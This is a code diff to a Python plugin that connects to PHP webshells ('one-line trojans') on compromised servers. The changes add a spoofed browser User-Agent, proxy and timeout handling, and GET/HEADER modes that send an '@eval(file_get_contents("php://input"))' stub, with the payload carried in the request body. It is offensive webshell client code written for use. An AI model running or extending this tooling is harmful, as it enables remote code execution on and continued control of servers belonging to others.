@@ -3,6 +3,7 @@ from typing import Any, Dict, Union
 import requests
 from api import Plugin, Session, CodeExecutor, ServerInfo, OSType, Command, SessionType, logger, utils, SessionOptions
 import json, base64, re
+import traceback
 
 
 def get_plugin_class():
@@ -15,6 +16,7 @@ def check_proxy(proxy:str)->str:
         raise ValueError(f"代理地址`{proxy}`格式错误！")
     return proxy
 
+
 class AdvancedExecutor(Plugin, CodeExecutor):
     name = "一句话木马连接器"
     description = '用于和一句话木马连接'
@@ -26,7 +28,8 @@ class AdvancedExecutor(Plugin, CodeExecutor):
     }
 
     def __init__(self):
-        pass
+        self.request = requests.session()
+        self.request.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 UOS'
 
     def on_loading(self, session: Session) -> bool:
         return super().on_loading(session)
@@ -84,16 +87,22 @@ class AdvancedExecutor(Plugin, CodeExecutor):
         delimiter = utils.random_bytes(16)
         payload = self.get_end_payload(payload, delimiter)
         ret:bytes = None
+        if timeout < 0:
+            timeout = self.session.options.get_option('timeout').value
+        elif timeout == 0:
+            timeout = 3600
+        timeout = (10, timeout)
+        proxies = {'http':proxy, 'https':proxy} if proxy else None
         try:
             if pwd_type == 'POST':
-                ret = requests.post(url, data={pwd:payload}, timeout=timeout if timeout else None, 
-                    proxies={'http':proxy, 'https':proxy} if proxy else None).content
+                ret = self.request.post(url, data={pwd:payload}, timeout=timeout, 
+                    proxies=proxies).content
             elif pwd_type == 'GET':
-                ret = requests.get(url, params={pwd:payload}, timeout=timeout if timeout else None,
-                    proxies={'http':proxy, 'https':proxy} if proxy else None).content
+                ret = self.request.get(url, params={pwd:'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
+                    proxies=proxies).content
             elif pwd_type == 'HEADER':
-                ret = requests.get(url, headers={pwd.upper():payload}, timeout=timeout if timeout else None,
-                    proxies={'http':proxy, 'https':proxy} if proxy else None).content
+                ret = self.request.get(url, headers={pwd.upper():'@eval(file_get_contents("php://input"));'},data=payload, timeout=timeout,
+                    proxies=proxies).content
             else:
                 logger.error(f"错误的密码类型，密码类型只能是POST、GET和HEADER！")
         except Exception as e:
